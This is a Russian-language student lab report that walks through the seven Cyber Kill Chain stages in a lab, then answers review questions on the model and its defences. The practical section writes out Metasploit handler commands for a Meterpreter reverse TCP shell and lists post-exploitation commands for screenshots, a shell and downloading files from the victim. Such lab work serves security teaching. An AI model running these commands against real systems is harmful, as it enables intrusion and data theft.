# Лабораторная работа №6. Моделирование Kill-chain процедур 
## (Вариант 1)
## Теоретическая часть


## Практическая часть

### Этап 1: Разведка (Reconnaissance)

Цель этапа -  собрать информацию о целевой машине.

Скришнот с Windows

<img width="578" height="402" alt="image" src="https://github.com/user-attachments/assets/c2c37eba-b9c1-4942-93ea-24ad7b4dfef2" />

Скриншот с Linux

<img width="1153" height="833" alt="image" src="https://github.com/user-attachments/assets/25451655-a92b-42e9-a150-8f73a3b539a4" />

### Этап 2: Создание «оружия» (Weaponization)

Цель этапа - создать вредоносную полезную нагрузку (payload).

<img width="1157" height="458" alt="image" src="https://github.com/user-attachments/assets/612720a4-d46a-452f-992c-b21a437156a9" />


### Этап 3: Доставка (Delivery)

Цель - доставить вредоносную нагрузку (payload.exe) на целевую машину.

С помощью загрузки по HTTP
<img width="1173" height="212" alt="image" src="https://github.com/user-attachments/assets/82c8821d-0de5-4cff-a33e-ab3ae13eaa11" />

2.	Произведите доставку на целевую машину не вручную, а одним из эксплойтов из состава Metasploit.

### Этап 4: Эксплуатация (Exploitation)
### Этап 5: Установка (Installation)
Задача: Заставить жертву запустить файл и получить контроль над системой.
Практическое действие:
1.	Подготовка атакующего: Запустите msfconsole (фреймворк Metasploit) на Kali. Настройте обработчик (handler), который будет ждать соединение от полезной нагрузки:

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP-адрес Kali>
set LPORT 4444
exploit

2.	Действие жертвы: На целевой машине Windows 10 пользователь запускает payload.exe (имитируя неосторожность). Может появиться окно UAC (Контроль учетных записей) — это точка возможного срыва атаки!
3.	Результат: Если пользователь подтвердит запуск, в консоли Metasploit на Kali появится сессия Meterpreter. Этапы Exploitation и Installation пройдены — вредоносный код выполнился и установил себя в памяти.

### Этап 6: Установление командования и управления (C2)
Задача: Убедиться, что связь установлена.
Практическое действие:
1.	В сессии Meterpreter выполните простые команды, например, sysinfo или getuid.
2.	Результат: Вы получите ответ от целевой машины. Это подтверждает, что канал C2 работает.

### Этап 7: Действия по достижению цели (Actions on Objectives)
Задача: Продемонстрировать, что может сделать злоумышленник.
Практическое действие:
1.	В сессии Meterpreter выполните одну из команд:
	screenshot — сделать скриншот экрана жертвы.
	shell — получить командную строку Windows.
	upload /path/to/file C:\\temp\\ — загрузить файл на целевую машину.
	download C:\\secret.txt /tmp/ — скачать файл с целевой машины.
2.	Это наглядно демонстрирует финальную цель атаки — кражу данных или контроль над системой.

## Ответы на контрольные вопросы
1.  **Дайте определение модели Kill Chain...** - Это модель, описывающая этапы кибератаки от первоначальной разведки до достижения конечной цели, позволяющая систематизировать атаку и защиту.
2.  **Кто и с какой целью разработал классическую модель Cyber Kill Chain?** Компания Lockheed Martin адаптировала военную концепцию для киберпространства с целью систематизации этапов атаки для построения эффективной обороны.
3.  **Перечислите все семь этапов...**
    1.  Разведка (Reconnaissance)
    2.  Создание оружия (Weaponization)
    3.  Доставка (Delivery)
    4.  Эксплуатация (Exploitation)
    5.  Установка (Installation)
    6.  Установление командования и управления (C2)
    7.  Действия по достижению цели (Actions on Objectives)
4.  **Какова основная оборонительная идея модели Kill Chain?** Разрыв цепочки атаки на любом из этапов приводит к срыву всей атаки или значительному увеличению ее стоимости для злоумышленника.
5.  **На каком этапе Kill Chain происходит отправка фишингового письма?** Этап "Доставка (Delivery)".
6.  **Что такое этап "Установление командования и управления" (C2)?** Это этап, на котором скомпрометированная система устанавливает связь с сервером злоумышленника для получения команд. Он критически важен, так как без него атакующий не может управлять своей жертвой.
7.  **Приведите пример контрмеры на этапе "Доставка".** Антиспам-фильтры, обучение пользователей, блокировка исполняемых вложений в почте.
8.  **Опишите сценарий атаки с использованием ransomware...**
    *   **Разведка:** Поиск компании с устаревшими системами.
    *   **Создание оружия:** Сборка шифровальщика.
    *   **Доставка:** Фишинг с вложенным документом-троянцем.
    *   **Эксплуатация:** Запуск макроса в документе.
    *   **Установка:** Копирование и запуск шифровальщика на диске.
    *   **C2:** (Опционально) Отправка ключа на сервер.
    *   **Действия:** Шифрование файлов и вывод требования выкупа.
9.  **Почему этапы "Доставка" и "Эксплуатация" считаются одними из самых эффективных для обороны?** Потому что на этих этапах атакующий вынужден взаимодействовать с защитными механизмами (антиспам, антивирус, EDR, патчи) и пользователем, который может распознать угрозу.
10. **В чем заключаются основные ограничения и недостатки классической модели Cyber Kill Chain?** Линейность, слабое отражение латерального движения, плохое описание инсайдерских угроз.
11. **Объясните, как модель Kill Chain используется при расследовании киберинцидентов.** Аналитики восстанавливают цепочку событий атаки, определяя, на каком этапе произошел взлом, какие методы использовались и какой ущерб нанесен, чтобы устранить последствия и укрепить защиту.
12. **В чем разница между этапами "Эксплуатация" и "Установка"?** "Эксплуатация" — это использование уязвимости для *выполнения кода*. "Установка" — это закрепление в системе путем *установки постоянного вредоносного ПО* (бэкдора).
13. **Сравните этап "Разведка" в Kill Chain и тактику "Сбор информации" в модели MITRE ATT&CK.**
**Общее:** Цель — сбор данных о цели. 
**Различие:** В Kill Chain это один из семи линейных этапов. В ATT&CK — это одна из многих тактик, которая может применяться многократно и нелинейно на протяжении всей атаки.
16. **Как концепция "Обороны в глубину" (Defense in Depth) связана с моделью Kill Chain?** "Оборона в глубину" реализуется путем выстраивания контрмер для *каждого этапа* Kill Chain, создавая многоуровневую защиту, где прорыв одного рубежа не означает прорыва всей обороны.
17. **Почему инсайдерская угроза плохо описывается классической моделью Kill Chain? Приведите пример.** Потому что инсайдер уже имеет доступ. Например, злонамеренный сотрудник, который решает скопировать базу данных клиентов на USB-накопитель. Этапы "Доставка" (3) и "Эксплуатация" (4) для него отсутствуют — он сразу переходит к "Действиям по достижению цели" (7).
